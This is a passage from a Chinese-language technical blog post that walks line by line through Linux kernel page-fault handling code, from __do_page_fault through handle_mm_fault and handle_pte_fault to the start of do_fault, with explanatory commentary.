this memory access, so</span></span><br><span class="line"><span class="comment"> * we can handle it..</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">good_area:</span><br><span class="line"><span class="keyword">if</span> (unlikely(access_error(error_code, vma))) &#123;</span><br><span class="line">bad_area_access_error(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If for any reason at all we couldn&#x27;t handle the fault,</span></span><br><span class="line"><span class="comment"> * make sure we exit gracefully rather than endlessly redo</span></span><br><span class="line"><span class="comment"> * the fault.  Since we never set FAULT_FLAG_RETRY_NOWAIT, if</span></span><br><span class="line"><span class="comment"> * we get VM_FAULT_RETRY back, the mmap_sem has been unlocked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">fault = handle_mm_fault(mm, vma, address, flags);</span><br><span class="line">major |= fault &amp; VM_FAULT_MAJOR;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we need to retry the mmap_sem has already been released,</span></span><br><span class="line"><span class="comment"> * and if there is a fatal signal pending there is no guarantee</span></span><br><span class="line"><span class="comment"> * that we made any progress. Handle this case first.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;</span><br><span class="line"><span class="comment">/* Retry at most once */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_ALLOW_RETRY) &#123;</span><br><span class="line">flags &amp;= ~FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line">flags |= FAULT_FLAG_TRIED;</span><br><span class="line"><span class="keyword">if</span> (!fatal_signal_pending(tsk))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* User mode? Just return to handle the fatal exception */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_USER)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Not returning to user mode? Handle exceptions or die: */</span></span><br><span class="line">no_context(regs, error_code, address, SIGBUS, BUS_ADRERR);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"><span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_ERROR)) &#123;</span><br><span class="line">mm_fault_error(regs, error_code, address, fault);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Major/minor page fault accounting. If any of the events</span></span><br><span class="line"><span class="comment"> * returned VM_FAULT_MAJOR, we account it as a major fault.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (major) &#123;</span><br><span class="line">tsk-&gt;maj_flt++;</span><br><span class="line">perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, <span class="number">1</span>, regs, address);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">tsk-&gt;min_flt++;</span><br><span class="line">perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, <span class="number">1</span>, regs, address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_v8086_mode(regs, address, tsk);</span><br><span class="line">&#125;</span><br><span class="line">NOKPROBE_SYMBOL(__do_page_fault);</span><br></pre></td></tr></table></figure><p>首先需要知道的是<code>vma</code>表示的是线性区描述符，<code>tsk</code>表示的是很熟悉的<code>task_struct</code>,<code>mm</code>也是前面文章中提到过的<code>mm_struct</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;</span><br></pre></td></tr></table></figure><p>首先通过这样一条语句初始化flags，随后初始化上述的变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(fault_in_kernel_space(address))) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT)))&#123;</span><br></pre></td></tr></table></figure><p>通过这条语句以及验证<code>error_code</code>判断缺页异常是否发生在内核空间，而<code>PF_RSVD | PF_USER | PF_PROT</code>的含义分别表示<code>页表项保留 ｜ 用户页异常 ｜ 页保护异常</code>。如果判断结果认定为内核地址空间发生的缺页则使用<code>vmalloc_fault(address)</code>进行处理。</p><p>随后还是主要分析用户态的缺页异常。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(error_code &amp; PF_RSVD))</span><br><span class="line">pgtable_bad(regs, error_code, address);</span><br></pre></td></tr></table></figure><p>如果使用了页表项保留的标识位则代表是页表错误并进行处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(smap_violation(error_code, regs))) &#123;</span><br><span class="line">  bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一步则是验证是否出发了<code>smap</code>保护，如果是则直接杀死进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(faulthandler_disabled() || !mm)) &#123;</span><br><span class="line">  bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里验证了时候开启了缺页不处理或者是不存在用户空间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (user_mode(regs)) &#123;</span><br><span class="line">  local_irq_enable();</span><br><span class="line">  error_code |= PF_USER;</span><br><span class="line">  flags |= FAULT_FLAG_USER;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (regs-&gt;flags &amp; X86_EFLAGS_IF)</span><br><span class="line">    local_irq_enable();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断寄存器发生缺页时是否为用户态寄存器，紧接着发送终端请求，然后设置<code>error_code</code>和<code>flags</code>为用户空间发生的缺页。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (error_code &amp; PF_WRITE)</span><br><span class="line">  flags |= FAULT_FLAG_WRITE;</span><br></pre></td></tr></table></figure><p>判断是否是在写的时候发生的，如果是的话则给flags添加相应的标识位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;</span><br><span class="line"><span class="keyword">if</span> ((error_code &amp; PF_USER) == <span class="number">0</span> &amp;&amp; </span><br><span class="line">    !search_exception_tables(regs-&gt;ip)) &#123;</span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">retry:</span><br><span class="line">down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">might_sleep();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后对<code>mm_struct</code>上锁，如果上锁失败并且发现是内核空间的异常则杀死进程，成功则继续。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">vma = find_vma(mm, address);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!vma)) &#123;</span><br><span class="line">  bad_area(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (likely(vma-&gt;vm_start &lt;= address))</span><br><span class="line">  <span class="keyword">goto</span> good_area;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;</span><br><span class="line">  bad_area(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (error_code &amp; PF_USER) &#123;</span><br><span class="line">  <span class="keyword">if</span> (unlikely(address + <span class="number">65536</span> + <span class="number">32</span> * <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>) &lt; regs-&gt;sp)) &#123;</span><br><span class="line">    bad_area(regs, error_code, address);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (unlikely(expand_stack(vma, address))) &#123;</span><br><span class="line">  bad_area(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里则是搜线搜索到地址对应的vma，如果vma不存在则杀死进程。如果使用的线性地址大于<code>vma-&gt;vm_start</code>则进入<code>good_area</code>。如果不是则进入下一个if，判断当前的vma是否为堆栈区，如果不是则直接杀死进程。紧接着验证是否为用户空间的缺页，如果是则紧接着是对栈的一个判断。后续则是增长线性区，如果失败也杀死进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">good_area:</span><br><span class="line"><span class="keyword">if</span> (unlikely(access_error(error_code, vma))) &#123;</span><br><span class="line">bad_area_access_error(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">fault = handle_mm_fault(mm, vma, address, flags);</span><br><span class="line">major |= fault &amp; VM_FAULT_MAJOR;</span><br></pre></td></tr></table></figure><p>运行到这里先是判断一下<code>error_code</code>与vma是否冲突，如果不冲突则进入分配物理页的核心函数<code>handle_mm_fault</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (flags &amp; FAULT_FLAG_ALLOW_RETRY) &#123;</span><br><span class="line">    flags &amp;= ~FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line">    flags |= FAULT_FLAG_TRIED;</span><br><span class="line">    <span class="keyword">if</span> (!fatal_signal_pending(tsk))</span><br><span class="line">      <span class="keyword">goto</span> retry;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (flags &amp; FAULT_FLAG_USER)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  no_context(regs, error_code, address, SIGBUS, BUS_ADRERR);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里判断是否需要充实，如果需要重试，那么进一步判断在开始初始化的flags中是否包含标志位<code>FAULT_FLAG_ALLOW_RETRY</code>，如果有的话则进行充实，并且擦出掉flags中的允许充实标识为，并且添加<code>FAULT_FLAG_TRIED</code>标志位。</p><h4 id="handle-mm-fault"><a href="#handle-mm-fault" class="headerlink" title="handle_mm_fault"></a><strong>handle_mm_fault</strong></h4><p>这个函数的中的真正处理函数其实是<code>__handle_mm_fault</code>，所以直接看其中的这个函数吧。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __handle_mm_fault(struct mm_struct *mm, struct vm_area_struct *vma,</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">pgd_t</span> *pgd;</span><br><span class="line"><span class="keyword">pud_t</span> *pud;</span><br><span class="line"><span class="keyword">pmd_t</span> *pmd;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(is_vm_hugetlb_page(vma)))</span><br><span class="line"><span class="keyword">return</span> hugetlb_fault(mm, vma, address, flags);</span><br><span class="line"></span><br><span class="line">pgd = pgd_offset(mm, address);</span><br><span class="line">pud = pud_alloc(mm, pgd, address);</span><br><span class="line"><span class="keyword">if</span> (!pud)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">pmd = pmd_alloc(mm, pud, address);</span><br><span class="line"><span class="keyword">if</span> (!pmd)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"><span class="keyword">if</span> (pmd_none(*pmd) &amp;&amp; transparent_hugepage_enabled(vma)) &#123;</span><br><span class="line"><span class="keyword">int</span> ret = create_huge_pmd(mm, vma, address, pmd, flags);</span><br><span class="line"><span class="keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">pmd_t</span> orig_pmd = *pmd;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">barrier();</span><br><span class="line"><span class="keyword">if</span> (pmd_trans_huge(orig_pmd)) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> dirty = flags &amp; FAULT_FLAG_WRITE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the pmd is splitting, return and retry the</span></span><br><span class="line"><span class="comment"> * the fault.  Alternative: wait until the split</span></span><br><span class="line"><span class="comment"> * is done, and goto retry.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (pmd_trans_splitting(orig_pmd))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pmd_protnone(orig_pmd))</span><br><span class="line"><span class="keyword">return</span> do_huge_pmd_numa_page(mm, vma, address,</span><br><span class="line">     orig_pmd, pmd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dirty &amp;&amp; !pmd_write(orig_pmd)) &#123;</span><br><span class="line">ret = wp_huge_pmd(mm, vma, address, pmd,</span><br><span class="line">orig_pmd, flags);</span><br><span class="line"><span class="keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">huge_pmd_set_accessed(mm, vma, address, pmd,</span><br><span class="line">      orig_pmd, dirty);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Use __pte_alloc instead of pte_alloc_map, because we can&#x27;t</span></span><br><span class="line"><span class="comment"> * run pte_offset_map on the pmd, if an huge pmd could</span></span><br><span class="line"><span class="comment"> * materialize from under us from a different thread.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(pmd_none(*pmd)) &amp;&amp;</span><br><span class="line">    unlikely(__pte_alloc(mm, vma, pmd, address)))</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"><span class="comment">/* if an huge pmd materialized from under us just retry later */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(pmd_trans_huge(*pmd)))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A regular pmd is established and it can&#x27;t morph into a huge pmd</span></span><br><span class="line"><span class="comment"> * from under us anymore at this point because we hold the mmap_sem</span></span><br><span class="line"><span class="comment"> * read mode and khugepaged takes it in write mode. So now it&#x27;s</span></span><br><span class="line"><span class="comment"> * safe to run pte_offset_map().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">pte = pte_offset_map(pmd, address);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handle_pte_fault(mm, vma, address, pte, pmd, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相信看过我前面那篇文章的都不会陌生<code>pgd | pud | pmd | pte</code>这四个页表，他们分表表示的是<code>页全局目录｜页上级目录｜页中间目录｜页表项</code>，这个函数中首先则是通过mm获取到pgd页全局目录，随后生成pud和pmd并为pmd创建中间项，在最后货渠道pte并进入到处理函数<code>handle_pte_fault</code>中。</p><h4 id="handle-pte-fault"><a href="#handle-pte-fault" class="headerlink" title="handle_pte_fault"></a><strong>handle_pte_fault</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">handle_pte_fault</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">pte_t</span> *pte, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pte_t</span> entry;</span><br><span class="line"><span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * some architectures can have larger ptes than wordsize,</span></span><br><span class="line"><span class="comment"> * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and CONFIG_32BIT=y,</span></span><br><span class="line"><span class="comment"> * so READ_ONCE or ACCESS_ONCE cannot guarantee atomic accesses.</span></span><br><span class="line"><span class="comment"> * The code below just needs a consistent view for the ifs and</span></span><br><span class="line"><span class="comment"> * we later double check anyway with the ptl lock held. So here</span></span><br><span class="line"><span class="comment"> * a barrier will do.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">entry = *pte;</span><br><span class="line">barrier();</span><br><span class="line"><span class="keyword">if</span> (!pte_present(entry)) &#123;</span><br><span class="line"><span class="keyword">if</span> (pte_none(entry)) &#123;</span><br><span class="line"><span class="keyword">if</span> (vma_is_anonymous(vma))</span><br><span class="line"><span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line"> pte, pmd, flags);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,</span><br><span class="line">flags, entry);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">pte, pmd, flags, entry);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pte_protnone(entry))</span><br><span class="line"><span class="keyword">return</span> do_numa_page(mm, vma, address, entry, pte, pmd);</span><br><span class="line"></span><br><span class="line">ptl = pte_lockptr(mm, pmd);</span><br><span class="line">spin_lock(ptl);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pte_same(*pte, entry)))</span><br><span class="line"><span class="keyword">goto</span> unlock;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line"><span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line"><span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">pte, pmd, ptl, entry);</span><br><span class="line">entry = pte_mkdirty(entry);</span><br><span class="line">&#125;</span><br><span class="line">entry = pte_mkyoung(entry);</span><br><span class="line"><span class="keyword">if</span> (ptep_set_access_flags(vma, address, pte, entry, flags &amp; FAULT_FLAG_WRITE)) &#123;</span><br><span class="line">update_mmu_cache(vma, address, pte);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is needed only for protection faults but the arch code</span></span><br><span class="line"><span class="comment"> * is not yet telling us if this is a protection fault or not.</span></span><br><span class="line"><span class="comment"> * This still avoids useless tlb flushes for .text page faults</span></span><br><span class="line"><span class="comment"> * with threads.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE)</span><br><span class="line">flush_tlb_fix_spurious_fault(vma, address);</span><br><span class="line">&#125;</span><br><span class="line">unlock:</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数开头初始化<code>entry</code>为pte的内存页然后我们继续逐行分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pte_present(entry)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (pte_none(entry)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (vma_is_anonymous(vma))</span><br><span class="line">      <span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line">                               pte, pmd, flags);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,</span><br><span class="line">                      flags, entry);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">                      pte, pmd, flags, entry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先判断页表是否存在于主存中，接着判断是否为none，如果为空则表示第一次访问该页，那么继续进入判断vma是否为匿名区，如果不是则执行<code>do_fault</code>返回物理页。如果该页不为空，软性缺页异常中的第二种情况，代表该页以前存在于主存中但是被调出了。</p><p>程序继续往后执行，下方代表的是内存页存在于主存中时的情况。</p><p>首先则是先加了一层锁<code>spin_lock(ptl);</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line">    <span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">                      pte, pmd, ptl, entry);</span><br><span class="line">  entry = pte_mkdirty(entry);</span><br><span class="line">&#125;</span><br><span class="line">entry = pte_mkyoung(entry);</span><br></pre></td></tr></table></figure><p>首先通过flags判断是否是应为写操作引起的缺页异常，紧接着看对应的页是否可写，如果不可写则进入<code>do_wp_page</code>函数中。后续就是将该页标脏和标上已经访问过。</p><p>经过上述流程不难发现当一个进程首次访问一个不可写的内存页时会触发两次缺页异常，一次是页不存在于主存中的情况，第二次是下面存在于主存的情况。</p><p>那么首先我们先看第一次进入的情况，此时处理的函数为<code>do_fault</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)</span><br><span class="line">- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;</span><br><span class="line"></span><br><span class="line">pte_unmap(page_table);</span><br><span class="line"><span class="comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span></span><br><span class="line"><span class="keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; 